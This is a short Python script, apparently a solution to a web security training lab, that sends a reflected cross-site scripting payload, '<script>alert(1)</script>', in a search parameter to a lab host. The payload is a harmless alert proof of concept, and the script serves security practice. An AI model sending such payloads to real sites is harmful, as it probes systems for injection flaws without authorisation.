import requests

s = requests.Session()
site = '0a170096030462ef8163c07800ae00a2.web-security-academy.net'
search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)